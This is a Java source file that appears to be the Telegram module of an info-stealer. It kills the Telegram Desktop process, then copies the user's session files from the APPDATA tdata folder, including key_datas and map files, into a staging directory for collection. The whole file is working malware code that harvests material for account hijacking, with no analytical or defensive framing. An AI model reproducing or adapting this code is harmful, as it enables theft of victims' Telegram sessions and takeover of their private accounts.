package itzgonza.hollyshit.impl.app;

import java.io.File;
import itzgonza.hollyshit.utils.utilities;

import org.apache.commons.io.FileUtils;

public class TelegramApp extends utilities {
    
    public void initialize() throws Exception {
        try {
            // Kill Telegram processes
            Runtime.getRuntime().exec("taskkill /IM Telegram.exe /F");
            Thread.sleep(1000);
        } catch (Exception ignored) {}
        
        String tdataPath = System.getenv("APPDATA") + "/Telegram Desktop/tdata";
        File tdataDir = new File(tdataPath);
        
        if (!tdataDir.exists()) {
            return;
        }
        
        File outputDir = new File(getFolder() + "/application/telegram/");
        outputDir.mkdirs();
        
        // Copy ONLY critical session files to avoid huge dumps/cache
        File[] tdataFiles = tdataDir.listFiles();
        if (tdataFiles != null) {
            for (File file : tdataFiles) {
                String name = file.getName();
                // Telegram session criteria: 16 char names, map*, or key_datas
                if (name.length() == 16 || name.startsWith("map") || name.equals("key_datas")) {
                    try {
                        if (file.isDirectory()) {
                            FileUtils.copyDirectory(file, new File(outputDir, "tdata/" + name));
                        } else {
                            FileUtils.copyFile(file, new File(outputDir, "tdata/" + name));
                        }
                    } catch (Exception ignored) {}
                }
            }
        }
        
        content.add("telegram");
    }
}